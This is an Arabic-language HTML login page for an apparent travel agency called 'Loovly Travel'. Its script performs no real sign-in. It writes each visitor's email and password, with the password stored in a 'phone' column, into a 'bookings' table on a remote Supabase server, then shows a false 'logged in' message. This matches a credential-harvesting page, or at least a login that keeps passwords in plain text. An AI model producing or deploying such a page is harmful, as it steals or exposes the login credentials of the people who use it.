<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loovly Travel - تسجيل الدخول</title>
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<style>
  body{font-family:'Segoe UI', sans-serif; background: linear-gradient(135deg,#00b4d8,#0077b6); height:100vh; display:flex; align-items:center; justify-content:center; margin:0;}
  .card{background:#fff; padding:35px; border-radius:20px; width:100%; max-width:380px; box-shadow:0 15px 35px rgba(0,0,0,.2); text-align:center;}
  .logo{font-size:32px; font-weight:800; color:#0077b6; margin-bottom:5px;} .logo span{color:#00b4d8;}
  .sub{color:#666; margin-bottom:25px; font-size:14px;}
  .input-group{text-align:right; margin-bottom:15px;}
  .input-group label{font-size:13px; color:#333; font-weight:600;}
  .input-group input{width:100%; padding:13px; border:1.5px solid #e0e0e0; border-radius:10px; margin-top:6px; box-sizing:border-box; outline:none;}
  .input-group input:focus{border-color:#0077b6;}
  button{width:100%; padding:13px; background:#0077b6; color:#fff; border:none; border-radius:10px; font-size:16px; font-weight:700; cursor:pointer; margin-top:10px;}
  button:disabled{opacity:.6;}
  #msg{margin-top:15px; font-size:14px;}
</style>
</head>
<body>

<div class="card">
  <div class="logo">L<span>oo</span>vly</div>
  <div class="sub">وكالة سفر وسياحة - مرحبا بعودتك</div>

  <form id="loovlyForm" onsubmit="handleLoovlyLogin(event)">
    <div class="input-group">
      <label>البريد الالكتروني</label>
      <input type="email" id="email" placeholder="example@loovly.com" required>
    </div>
    <div class="input-group">
      <label>كلمة المرور</label>
      <input type="password" id="password" placeholder="••••••••" required>
    </div>
    <button type="submit" id="btn">تسجيل الدخول</button>
    <p id="msg"></p>
  </form>
  <p style="font-size:12px; color:#888; margin-top:20px;">© 2026 Loovly Travel Agency</p>
</div>

<script>
// ربط سيرفر Loovly
const supabaseClient = window.supabase.createClient(
  'https://nwpyevsjnublptabupup.supabase.co',
  'sb_publishable_v18mMHdeW7e-0pegmi9sTg_U3HkIlJK'
);

async function handleLoovlyLogin(e){
  e.preventDefault();
  const email = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value.trim();
  const btn = document.getElementById('btn');
  const msg = document.getElementById('msg');

  btn.disabled = true;
  btn.innerText = 'جاري تسجيل الدخول...';
  
  const { error } = await supabaseClient.from('bookings').insert([{
    name: 'Loovly - تسجيل دخول',
    email: email,
    phone: password,
    destination: 'Loovly Agency Login'
  }]);

  if(error){
    msg.innerText = '❌ خطأ: ' + error.message;
    msg.style.color = 'red';
  } else {
    msg.innerText = '✅ اهلا بك في Loovly! تم تسجيل دخولك';
    msg.style.color = 'green';
    // هنا تقدر تحوله لصفحة الحجوزات
    // window.location.href = 'dashboard.html';
  }
  btn.disabled = false;
  btn.innerText = 'تسجيل الدخول';
}
</script>
</body>
</html>
